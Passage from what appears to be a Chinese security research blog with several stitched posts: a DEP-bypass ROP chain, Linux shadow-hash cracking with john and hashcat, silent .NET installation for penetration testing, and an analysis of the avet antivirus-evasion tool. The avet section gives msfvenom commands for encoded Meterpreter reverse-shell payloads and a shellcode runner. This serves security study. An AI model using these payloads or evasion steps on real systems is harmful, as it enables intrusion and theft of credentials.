      0x6932ea52,  // POP EAX // RETN [MSVCR110.dll] 
      0xffffffff,  // Value to negate, will become 0x00000001
      0x69353746,  // NEG EAX // RETN [MSVCR110.dll] 
      0x75da655d,  // XCHG EAX,EBX // ADD BH,CH // DEC ECX // RETN 0x10 [KERNELBASE.dll] 
      0x77216829,  // POP EAX // RETN [kernel32.dll] 
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      0xa2800fc0,  // put delta into eax (-&gt; put 0x00001000 into edx)
      0x7721502a,  // ADD EAX,5D800040 // RETN 0x04 [kernel32.dll] 
      0x771abd3a,  // XCHG EAX,EDX // RETN [kernel32.dll] 
      0x41414141,  // Filler (RETN offset compensation)
      0x69329bb1,  // POP EAX // RETN [MSVCR110.dll] 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x69354484,  // NEG EAX // RETN [MSVCR110.dll] 
      0x771d0946,  // XCHG EAX,ECX // RETN [kernel32.dll] 
      0x6935e68f,  // POP EDI // RETN [MSVCR110.dll] 
      0x69354486,  // RETN (ROP NOP) [MSVCR110.dll]

    0x771c80a2, // # XOR EAX,EAX # POP EBX # RETN   [kernel32.dll]   |   {PAGE_EXECUTE_READ}
    0x00000028, // Set EBX=0x00000028(40)

    0x693a7031,  // POP EAX // RETN [MSVCR110.dll] 
      0x90909090,  // nop
      0x69390267,  // PUSHAD // RETN [MSVCR110.dll] 
      
      0x9059016A,  //PUSH 1  // POP ECX 
      0x90909090,
      0x90909090,
      0x90909090,
      0x90909090
};
</code></pre></div></div>

<p>重新编译，使用OllyDbg打开，单步跟踪到VirtualAllocEx()函数入口点</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-17/2-7.png" alt="Alt text"></p>

<p>如图，查看传入的函数参数</p>

<p>内存长度被修改为0x00000028(40)，其他传入参数正常</p>

<p>继续运行，进入<code class="language-plaintext highlighter-rouge">CALL ESP</code>，shellcode成功执行</p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>利用VirtualAlloc绕过DEP同利用VirtualProtect绕过DEP一样，都需要注意内存页长度的限制，无法跨页修改或者申请内存，这就对shellcode的长度提出了要求</p>

<p>当然，正常调用API实现VirtualProtect和VirtualAlloc不会存在跨内存页失败的问题</p>

<p>mona自动生成的rop链可作为参考模板，结合rop.txt下的替代指令，可构造更合适的ROP链</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on March 17, 2017
  </div>

  
</article><article class="post">
  <h1>Linux下的密码Hash——加密方式与破解方法的技术整理</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Linux系统下，用户的密码会被加密保存在文件<code class="language-plaintext highlighter-rouge">/etc/shadow</code>中，关于密码的加密方式与破解方法有哪些呢？本文尝试对这一部分内容进行整理，介绍相关基础知识，测试常用方法，帮助大家对此有更直观的认识。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>Linux下用户密码的保存格式</li>
  <li>Linux下用户密码的加密方法</li>
  <li>破解用户密码hash的常用工具和方法</li>
</ul>

<h2 id="0x02-linux下用户密码的保存格式">0x02 Linux下用户密码的保存格式</h2>
<hr>

<p>Linux密码信息保存在两个文件中，分别为：<code class="language-plaintext highlighter-rouge">/etc/passwd</code>和<code class="language-plaintext highlighter-rouge">/etc/shadow</code></p>

<h3 id="etcpasswd">/etc/passwd:</h3>

<p>普通用户权限能够查看</p>

<p>保存用户信息，每一行代表一个用户，每一行通过冒号<code class="language-plaintext highlighter-rouge">：</code>分为七个部分</p>

<ol>
  <li>用户名</li>
  <li>密码，x表示密码保存在<code class="language-plaintext highlighter-rouge">/etc/shadow</code></li>
  <li>UID，0代表root</li>
  <li>GID，表示所在组</li>
  <li>描述信息，依次为Full Name、Room Number、Work Phone、Home Phone和Other</li>
  <li>用户主目录</li>
  <li>默认shell类型</li>
</ol>

<p><strong>eg.</strong></p>

<p><code class="language-plaintext highlighter-rouge">test2:x:1001:1001:test2,11111,111111-11,222222-22,test:/home/test2:/bin/bash</code></p>

<ul>
  <li>用户名：test2</li>
  <li>密码保存在<code class="language-plaintext highlighter-rouge">/etc/shadow</code></li>
  <li>UID为1001</li>
  <li>GID为1001</li>
  <li>描述信息：
  Full Name []: test2
  Room Number []: 11111
  Work Phone []: 111111-11
  Home Phone []: 222222-22
  Other []: test</li>
  <li>用户主目录为<code class="language-plaintext highlighter-rouge">/home/test2</code></li>
  <li>默认shell为<code class="language-plaintext highlighter-rouge">/bin/bash</code></li>
</ul>

<h3 id="etcshadow">/etc/shadow:</h3>

<p>只有root用户权限能够查看</p>

<p>保存加密后的密码和用户的相关密码信息，每一行代表一个用户，每一行通过冒号<code class="language-plaintext highlighter-rouge">：</code>分为九个部分</p>

<ol>
  <li>用户名</li>
  <li>加密后的密码</li>
  <li>上次修改密码的时间(从1970.1.1开始的总天数)</li>
  <li>两次修改密码间隔的最少天数，如果为0，则没有限制</li>
  <li>两次修改密码间隔最多的天数,表示该用户的密码会在多少天后过期，如果为99999则没有限制</li>
  <li>提前多少天警告用户密码将过期</li>
  <li>在密码过期之后多少天禁用此用户</li>
  <li>用户过期日期(从1970.1.1开始的总天数)，如果为0，则该用户永久可用</li>
  <li>保留</li>
</ol>

<p><strong>注：</strong></p>

<p>参数说明可通过<code class="language-plaintext highlighter-rouge">man shadow</code>获取</p>

<p><strong>eg.</strong></p>

<p><code class="language-plaintext highlighter-rouge">test2:$6$C/vGzhVe$aKK6QGdhzTmYyxp8.E68gCBkPhlWQ4W7/OpCFQYV.qsCtKaV00bToWh286yy73jedg6i0qSlZkZqQy.wmiUdj0:17470:0:99999:7:::</code></p>

<ul>
  <li>用户名：test2</li>
  <li>加密后的密码：<code class="language-plaintext highlighter-rouge">$6$C/vGzhVe$aKK6QGdhzTmYyxp8.E68gCBkPhlWQ4W7/OpCFQYV.qsCtKaV00bToWh286yy73jedg6i0qSlZkZqQy.wmiUdj0</code></li>
  <li>上次修改密码的时间(从1970.1.1开始的总天数为17470)</li>
  <li>两次修改密码间隔：没有限制</li>
  <li>两次修改密码间隔最多的天数：没有限制</li>
  <li>提前7天警告用户密码将过期</li>
  <li>该用户永久可用</li>
</ul>

<p>由示例可知，加密的密码具有固定格式：</p>

<p><code class="language-plaintext highlighter-rouge">$id$salt$encrypted</code></p>

<p>id表示加密算法，1代表<code class="language-plaintext highlighter-rouge">MD5</code>，5代表<code class="language-plaintext highlighter-rouge">SHA-256</code>，6代表<code class="language-plaintext highlighter-rouge">SHA-512</code>
salt表示密码学中的Salt,系统随机生成
encrypted表示密码的hash</p>

<h2 id="0x03-破解用户密码hash的常用工具和方法">0x03 破解用户密码hash的常用工具和方法</h2>
<hr>

<p>由于Linux的密码加密使用了Salt,所以无法使用彩虹表的方式进行破解,常用的方法为字典破解和暴力破解</p>

<p>字典破解和暴力破解的常用工具：</p>

<h3 id="1john-the-ripper">1、John the Ripper</h3>

<h4 id="1-字典破解">(1) 字典破解</h4>

<p>Kali2.0集成了John the Ripper</p>

<p>字典文件位于<code class="language-plaintext highlighter-rouge">/usr/share/john/password.lst</code></p>

<p>使用Kali Linux上的John自带的密码列表。路径为<code class="language-plaintext highlighter-rouge">/usr/share/john/password.lst</code></p>

<p>使用字典破解：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john --wordlist=/usr/share/john/password.lst ./shadow 
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>也可使用其他字典</p>

<h4 id="2-暴力破解">(2) 暴力破解：</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john ./shadow 
</code></pre></div></div>

<p>列出已破解的明文密码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john --show ./shadow 
</code></pre></div></div>

<p>结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-30/2-1.png" alt="Alt text"></p>

<h3 id="2hashcat">2、hashcat</h3>

<p>Kali2.0集成了hashcat</p>

<p>字典文件使用<code class="language-plaintext highlighter-rouge">/usr/share/john/password.lst</code></p>

<p>修改hash格式：只保留<code class="language-plaintext highlighter-rouge">$salt$encrypted</code></p>

<p><strong>eg.</strong></p>

<p>原hash：</p>

<p><code class="language-plaintext highlighter-rouge">test2:$6$C/vGzhVe$aKK6QGdhzTmYyxp8.E68gCBkPhlWQ4W7/OpCFQYV.qsCtKaV00bToWh286yy73jedg6i0qSlZkZqQy.wmiUdj0:17470:0:99999:7:::</code></p>

<p>修改后：</p>

<p><code class="language-plaintext highlighter-rouge">$6$C/vGzhVe$aKK6QGdhzTmYyxp8.E68gCBkPhlWQ4W7/OpCFQYV.qsCtKaV00bToWh286yy73jedg6i0qSlZkZqQy.wmiUdj0</code></p>

<h4 id="1-字典破解-1">(1) 字典破解：</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -m 1800 -o found1.txt --remove shadow /usr/share/john/password.lst 
</code></pre></div></div>

<p>参数说明：</p>

<p>-m：hash-type，1800对应<code class="language-plaintext highlighter-rouge">SHA-512 </code>
详细参数可查表：https://hashcat.net/wiki/doku.php?id=example_hashes
-o：输出文件
–remove：表示hash被破解后将从hash文件移除
shadow：代表hash文件
/usr/share/john/password.lst：代表字典文件</p>

<p>成功破解出2个hash，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-30/2-2.png" alt="Alt text"></p>

<h4 id="2-暴力破解-1">(2) 暴力破解：</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -m 1800 -a 3 -o found2.txt shadow ?l?l?l?l --force
</code></pre></div></div>

<p>参数说明：
-a：attack-mode，默认为0，3代表Brute-force，即暴力破解
?l：表示小写字母，即abcdefghijklmnopqrstuvwxyz，4个?l代表暴力破解的长度为4
?u：表示大写字母，即ABCDEFGHIJKLMNOPQRSTUVWXYZ
?h：代表十六进制字符小写，即0123456789
?H：代表十六进制字符大写，即0123456789abcdef
?s：表示特殊符号，即!”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~
?a：表示所有字符，即?l?u?d?s
?b：表示十六进制，即0x00 - 0xff</p>

<p>成功暴力破解出hash，结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-30/2-3.png" alt="Alt text"></p>

<h3 id="3在线网站">3、在线网站</h3>

<p>1.https://hce.iteknical.com/</p>

<p>HCE分布式计算平台,需要积分才能使用</p>

<p>2.http://www.cmd5.com/</p>

<p>目前暂不支持SHA-512</p>

<h3 id="4mimipenguin">4、mimipenguin</h3>

<p>下载地址：</p>

<p>https://github.com/huntergregal/mimipenguin</p>

<p>原理类似于mimikatz，通过内存导出明文密码</p>

<h2 id="0x04-小结">0x04 小结</h2>
<hr>

<p>本文介绍了Linux下的密码保存格式，测试了两款常用工具：John the Ripper和hashcat，分别使用字典和暴力两种破解方法。</p>

<p>作为一篇总结基础知识的文章，希望能够尽可能的做到简洁实用，欢迎读者补充，后续也会对这部分内容不断进行完善。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on October 30, 2017
  </div>

  
</article><article class="post">
  <h1>渗透基础——命令行下安装Microsoft .NET Framework</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在渗透测试中，有些工具的运行(例如高版本的Powershell)需要依赖Microsoft .NET Framework 4.0的环境。
而默认配置下，Win7不支持Microsoft .NET Framework 4.0。为了保证工具能够在Win7下使用，这里就需要在命令行下实现安装Microsoft .NET Framework 4.0。</p>

<p>经过一番搜索，我没有找到介绍命令行下安装Microsoft .NET Framework的资料。</p>

<p>于是我写了这篇文章，介绍我的实现方法，开源C代码，分享实现原理和脚本开发的细节。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>Win7下安装Microsoft .NET Framework 4.0的正常方法</li>
  <li>命令行下的实现方法</li>
  <li>实现原理</li>
  <li>脚本开发的细节</li>
</ul>

<h2 id="0x02-win7下安装microsoft-net-framework-40的正常方法">0x02 Win7下安装Microsoft .NET Framework 4.0的正常方法</h2>
<hr>

<p>Microsoft .NET Framework的安装包分为两种：</p>

<p>(1)Web Installer</p>

<p>下载地址：</p>

<p>https://www.microsoft.com/en-us/download/details.aspx?displaylang=en&amp;id=17851</p>

<p>Web Installer的文件很小，在安装过程中需要Internet连接来下载其他所需的.NET Framework组件</p>

<p>(2)Standalone Installer</p>

<p>下载地址：</p>

<p>https://www.microsoft.com/en-US/Download/confirmation.aspx?id=17718</p>

<p>Standalone Installer的文件相对来说会很大，因为它包括了完整的组件，在安装过程中不需要Internet连接</p>

<p>这里以Standalone Installer为例，正常的流程如下：</p>

<h3 id="1下载standalone-installer">1.下载Standalone Installer</h3>

<p>获得文件dotNetFx40_Full_x86_x64.exe</p>

<h3 id="2运行dotnetfx40_full_x86_x64exe">2.运行dotNetFx40_Full_x86_x64.exe</h3>

<p>弹出对话框，选择同意协议后点击Install按钮</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-3/2-1.png" alt="Alt text"></p>

<h3 id="3等待安装过程">3.等待安装过程</h3>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-3/2-2.png" alt="Alt text"></p>

<h3 id="4安装完成弹出对话框">4.安装完成，弹出对话框</h3>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-3/2-3.png" alt="Alt text"></p>

<p>点击Finish按钮进入下一步</p>

<h3 id="5再次弹出对话框提示选择是否重启系统">5.再次弹出对话框，提示选择是否重启系统</h3>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-3/2-4.png" alt="Alt text"></p>

<p>在系统重启后，完成所有安装工作</p>

<h2 id="0x03-命令行下的实现方法">0x03 命令行下的实现方法</h2>
<hr>

<p>这里介绍我最开始的思路：</p>

<ol>
  <li>我们可以通过向安装程序的面板发送按键消息来模拟用户的点击行为</li>
  <li>为保证在命令行下安装，需要对弹出的对话框发送隐藏窗口的消息</li>
  <li>为保证按键准确，这里不应该采用计算坐标的方法模拟鼠标点击，而是枚举窗口获得按钮的句柄，向目标句柄发送鼠标点击的消息</li>
</ol>

<p>为了验证我的思路，首先需要编写程序查看是否能够获得每个安装页面的按钮句柄</p>

<p>我写了如下C代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;afx.h&gt;
#include &lt;Windows.h&gt;
BOOL CALLBACK EnumChildWindowProc(HWND Child_hWnd, LPARAM lParam)
{
	WCHAR szTitle[1024];
	if (Child_hWnd)
	{
		GetWindowText(Child_hWnd, szTitle, sizeof(szTitle));
		printf("[*] Handle: %08X\n", Child_hWnd);
		printf("[*] Caption: %ws\n", szTitle);
		return true;
	}
	return false;
}
int _tmain(int argc, _TCHAR *argv[])
{
	HWND hWnd3 = FindWindow(NULL, L"Microsoft .NET Framework 4 Setup");
	if (hWnd3 == NULL)
	{
		printf("[!] I can't find the main window.\n");
		return 0;
	}	
	EnumChildWindows(hWnd3, EnumChildWindowProc, 0);
	return 0;
}
</code></pre></div></div>

<p>对于第一个安装页面，使用程序来枚举所有子窗口，输出句柄和标题，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-3/3-1.png" alt="Alt text"></p>

<p>这里需要注意Install按钮，默认为disable状态，如果想要进入下一步，需要先将Install按钮设置为enable状态，再发送鼠标点击的消息</p>

<p>在代码实现上加上一个if判断来实现，关键代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if (wcscmp(szTitle, L"&amp;Install") == 0)
{
	printf("[+] Catch it!\n");
	printf("[*] Handle: %08X\n", Child_hWnd);
	printf("[*] Caption: %ws\n", szTitle);
	printf("[*] Enable the Install button.\n");	
	EnableWindow(Child_hWnd, TRUE);
	printf("[*] Send the click command to &amp;Install.\n");
	::PostMessage(Child_hWnd, WM_LBUTTONDOWN, MK_LBUTTON, MAKELPARAM(0,0));
	::PostMessage(Child_hWnd, WM_LBUTTONUP, MK_LBUTTON, MAKELPARAM(0, 0));
}
</code></pre></div></div>

<p>完成这一步后我们进入下一步，等待安装结束后进入第二个页面，同样枚举一下所有子窗口，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-3/3-2.png" alt="Alt text"></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-3/3-3.png" alt="Alt text"></p>

<p>我们看到，之前页面的子窗口还在，我们需要向Finish按钮发送鼠标点击消息，关键代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if (wcscmp(szTitle, L"&amp;Finish") == 0)
{
	printf("[+] Catch it!\n");
	printf("[*] Handle: %08X\n", Child_hWnd);
	printf("[*] Caption: %ws\n", szTitle);
	printf("[*] Send the click command to &amp;Finish.\n");
	::PostMessage(Child_hWnd, WM_LBUTTONDOWN, MK_LBUTTON, MAKELPARAM(0, 0));
	::PostMessage(Child_hWnd, WM_LBUTTONUP, MK_LBUTTON, MAKELPARAM(0, 0));
}
</code></pre></div></div>

<p>接下来进入最后一步，再一次枚举所有子窗口，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-3/3-4.png" alt="Alt text"></p>

<p>我们看到，页面的子窗口被刷新，在程序实现上这里需要重新获得主窗口的句柄，我们向Restart Later按钮发送鼠标点击消息，关键代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if (wcscmp(szTitle, L"Restart &amp;Later") == 0)
{
	printf("[+] Catch it!\n");
	printf("[*] Handle: %08X\n", Child_hWnd);
	printf("[*] Caption: %ws\n", szTitle);
	printf("[*] Send the click command to Restart &amp;Later.\n");
	::PostMessage(Child_hWnd, WM_LBUTTONDOWN, MK_LBUTTON, MAKELPARAM(0, 0));
	::PostMessage(Child_hWnd, WM_LBUTTONUP, MK_LBUTTON, MAKELPARAM(0, 0));
}
</code></pre></div></div>

<p>至此，关键的实现代码已经完成</p>

<p>而要完整的实现在命令行下安装Microsoft .NET Framework，还需要考虑以下问题;</p>

<h4 id="1当启动安装程序dotnetfx40_full_x86_x64exe前需要检查安装环境如果已经存在另一个安装进程那么会弹框提示冲突">1.当启动安装程序dotNetFx40_Full_x86_x64.exe前，需要检查安装环境，如果已经存在另一个安装进程，那么会弹框提示冲突</h4>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-3/4-1.png" alt="Alt text"></p>

<p>这里需要在启动前做一个判断：如果存在另一个安装进程，就结束安装操作</p>

<h4 id="2当启动安装程序dotnetfx40_full_x86_x64exe时会启动子进程setupexe这里没法做到通过设置启动参数隐藏启动进程setupexe来隐藏窗口">2.当启动安装程序dotNetFx40_Full_x86_x64.exe时，会启动子进程Setup.exe，这里没法做到通过设置启动参数隐藏启动进程Setup.exe来隐藏窗口</h4>

<p>这里需要加一个循环判断，只要发现主窗口就对其隐藏</p>

<p>为了避免CPU占用过多，在做while循环时，应该加一个Sleep函数</p>

<h4 id="3启动安装程序后需要模拟鼠标点击">3.启动安装程序后需要模拟鼠标点击</h4>

<p>需要注意的是，接下来的安装过程中，子窗口Install(名称为<code class="language-plaintext highlighter-rouge">&amp;Install</code>)会一直存在，为了避免重复向Install按钮发送点击消息，在实现上我使用了第二个函数来匹配其他按钮</p>

<h4 id="4安装完成后弹出新的窗口提示安装成功捕获子窗口向其发送鼠标按键的命令">4.安装完成后，弹出新的窗口提示安装成功，捕获子窗口，向其发送鼠标按键的命令</h4>

<p>这里捕获的子窗口名称为<code class="language-plaintext highlighter-rouge">&amp;Finish</code></p>

<h4 id="5接下来弹框提示是否重新启动系统时需要通过findwindow重新获得句柄">5.接下来，弹框提示是否重新启动系统时，需要通过FindWindow()重新获得句柄</h4>

<p>这里可以放在第二个函数的同一个循环中，当发现子窗口<code class="language-plaintext highlighter-rouge">Restart &amp;Later</code>时，向其发送鼠标按键的命令</p>

<p>需要注意弹出的窗口为新窗口，不能使用之前的窗口句柄，需要通过FindWindow()重新获得句柄</p>

<p>完整实现代码已开源，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/Install_.Net_Framework_from_the_command_line.cpp</p>

<p>代码支持命令行下安装Microsoft .NET Framework 4、Microsoft .NET Framework 4.5和Microsoft .NET Framework 4.5.1</p>

<h2 id="0x04-小结">0x04 小结</h2>
<hr>

<p>本文介绍了通过发送鼠标消息在命令行下安装Microsoft .NET Framework的方法，开源C代码，分享实现原理和脚本开发的细节。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on November  3, 2019
  </div>

  
</article><article class="post">
  <h1>AntiVirus Evasion Tool(avet)测试分析</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>avet是一款用来绕过杀毒软件检测的工具，使用了多种不同的反病毒规避技术。</p>

<p>分别入选blackhat ASIA 2017 arsnal、blackhat USA 2017 arsnal和blackhat USA 2018 arsnal：</p>

<p>https://www.blackhat.com/asia-17/arsenal.html#avet-antivirus-evasion-tool</p>

<p>https://www.blackhat.com/us-17/arsenal/schedule/index.html#avet—antivirus-evasion-tool-7908</p>

<p>https://www.blackhat.com/us-18/arsenal/schedule/index.html#avet-antivirus-evasion-tool-10692</p>

<p>github开源地址：</p>

<p>https://github.com/govolution/avet</p>

<p>本文将要对其进行测试，结合自己的经验分析avet使用的反病毒规避技术</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>环境搭建</li>
  <li>使用流程</li>
  <li>工具实现细节</li>
  <li>技术细节分析</li>
</ul>

<h2 id="0x02-环境搭建">0x02 环境搭建</h2>
<hr>

<p>测试系统：<code class="language-plaintext highlighter-rouge">kali2 x64</code></p>

<h3 id="1下载">1、下载</h3>

<p>https://github.com/govolution/avet</p>

<h3 id="2编译">2、编译</h3>

<p>如果使用32位kali系统，需要编译</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -o make_avet make_avet.c
</code></pre></div></div>

<p>64位kali系统不需要</p>

<h3 id="3安装wine32">3、安装wine32</h3>

<p>否则，无法生成exe</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-15/2-1.png" alt="Alt text"></p>

<p>安装命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32
</code></pre></div></div>

<h3 id="4安装tdm-gcc">4、安装TDM GCC</h3>

<p>参考地址：</p>

<p>https://govolution.wordpress.com/2017/02/04/using-tdm-gcc-with-kali-2/</p>

<p>下载：</p>

<p>https://sourceforge.net/projects/tdm-gcc/</p>

<p>安装：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wine tdm64-gcc-5.1.0-2.exe
</code></pre></div></div>

<p>弹出安装窗口，选择<code class="language-plaintext highlighter-rouge">Create</code></p>

<p>选择<code class="language-plaintext highlighter-rouge">MinGW-w64/TDM64(32-bit and 64-bit)</code></p>

<p>接下来，均选择默认设置，最后安装</p>

<h3 id="5测试">5、测试</h3>

<p>执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./make_avet -h
</code></pre></div></div>

<p>获得参数说明</p>

<h2 id="0x03-使用流程">0x03 使用流程</h2>
<hr>

<h3 id="1执行avet_fabricpy">1、执行avet_fabric.py</h3>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-15/3-1.png" alt="Alt text"></p>

<h3 id="2选择script">2、选择script</h3>

<p>这里选择<code class="language-plaintext highlighter-rouge">7: build_win64_meterpreter_rev_tcp_xor.sh</code></p>

<h3 id="3编辑脚本内容">3、编辑脚本内容</h3>

<p>显示默认脚本内容，可进行修改，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-15/3-2.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>脚本内容对应文件<code class="language-plaintext highlighter-rouge">/build/build_win64_meterpreter_rev_tcp_xor.sh</code></p>

<p>默认脚本内容及说明如下：</p>

<p>(1)  指定gcc编译设置，内容为<code class="language-plaintext highlighter-rouge">win64_compiler="wine gcc -m64"</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>. build/global_win64.sh
</code></pre></div></div>

<p>(2) 使用meterpreter生成reverse payload并保存为sc.txt</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.116.142 lport=443 -e x64/xor -f c --platform Windows &gt; sc.txt
</code></pre></div></div>

<p>(3) 读取sc.txt的内容，提取出shellcode，删除文件sc.txt</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./format.sh sc.txt &gt; scclean.txt &amp;&amp; rm sc.txt
</code></pre></div></div>

<p>(4) 调用make_avet，向文件defs.h传入shellcode和功能标志位</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./make_avet -f scclean.txt -X -E
</code></pre></div></div>

<p>(5) 使用gcc编译avet.c(avet.c会调用defs.h)，生成最终文件pwn.exe</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$win64_compiler -o pwn.exe avet.c
</code></pre></div></div>

<p>(6) 删除文件scclean.txt，清空文件defs.h</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rm scclean.txt &amp;&amp; echo "" &gt; defs.h
</code></pre></div></div>

<h3 id="4执行生成最终文件">4、执行，生成最终文件</h3>

<p>确认脚本内容后，输入回车，执行脚本，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-15/3-3.png" alt="Alt text"></p>

<p>生成最终文件pwn.exe</p>

<h2 id="0x04-工具实现细节">0x04 工具实现细节</h2>
<hr>

<h3 id="1通过meterpreter生成payload并保存文件">1、通过meterpreter生成payload并保存文件</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.116.142 lport=443 -e x64/xor -f hex --platform Windows &gt; sc.txt
</code></pre></div></div>

<p>文件内容如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-15/4-1.png" alt="Alt text"></p>

<h3 id="2运行formatsh将shellcode从前面的文件提取出来">2、运行format.sh将shellcode从前面的文件提取出来</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./format.sh sc.txt &gt; scclean.txt
</code></pre></div></div>

<p>提取后的文件内容如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-15/4-2.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>个人认为，以上两步可通过一条命令实现：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.116.142 lport=443 -e x64/xor -f hex --platform Windows &gt; sc.txt
</code></pre></div></div>

<h3 id="3运行make_avet从前面的文件提取shellcode并设置功能标志位写入文件defsh">3、运行make_avet，从前面的文件提取shellcode，并设置功能标志位，写入文件defs.h</h3>

<p>功能标志位对应make_avet支持的多种功能，可通过执行<code class="language-plaintext highlighter-rouge">./make_avet -h</code>获得详细说明</p>

<p>具体功能如下：</p>

<ul>
  <li>从指定文件读取shellcode并执行</li>
  <li>从指定文件读取加密的shellcode，解密后执行</li>
  <li>调用iexplore.exe访问指定url，获得shellcode并执行</li>
  <li>通过WinAPI调用socket，访问指定url的80端口，获得shellcode并执行</li>
  <li>通过certutil下载文件，获得shellcode并执行</li>
  <li>通过powershell下载文件，获得shellcode并执行</li>
  <li>使用WinAPI fopen绕过沙盒</li>
  <li>使用WinAPI gethostbyname绕过沙盒</li>
  <li>编译成64位</li>
  <li>隐藏程序窗口</li>
</ul>

<h3 id="4使用gcc编译avetc生成最终文件">4、使用gcc编译avet.c，生成最终文件</h3>

<p>avet.c为主体程序，从头文件defs.h读取shellcode和功能标志位</p>

<h2 id="0x05-技术细节分析">0x05 技术细节分析</h2>
<hr>

<h3 id="1执行shellcode的核心代码">1、执行shellcode的核心代码</h3>

<p>(1)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void exec_shellcode(unsigned char *shellcode)
{
	int (*funct)();
	funct = (int (*)()) shellcode;
	(int)(*funct)();
}
</code></pre></div></div>

<p>对应生成shellcode的参数：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.116.142 lport=443 -e x86/xor -f hex -a x86 --platform Windows &gt; sc.txt
</code></pre></div></div>

<p>(2)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void exec_shellcode_ASCIIMSF(unsigned char *shellcode)
